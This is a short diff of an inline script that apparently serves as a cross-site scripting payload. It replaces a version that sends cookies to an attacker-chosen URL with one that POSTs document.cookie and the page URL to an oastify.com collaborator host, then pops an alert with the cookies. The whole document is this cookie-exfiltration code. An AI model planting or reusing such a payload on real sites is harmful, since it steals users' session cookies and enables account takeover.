@@ -1,11 +1,8 @@
 <script>
-    const queryString = window.location.search;
-    const urlParams = new URLSearchParams(queryString);
-    const urlParam = urlParams.get('url');
-
-    if (urlParam) {
-        fetch(urlParam + '?c=' + encodeURIComponent(document.cookie))
-    }
+    fetch('https://98fxq50icwmvghx5dkr9uy72htnrbiz7.oastify.com/xss', {
+        method: 'POST',
+        body: 'Cookies: ' + document.cookie + ' URL: ' + window.location.href
+    });
 
     alert(document.cookie)
 </script>
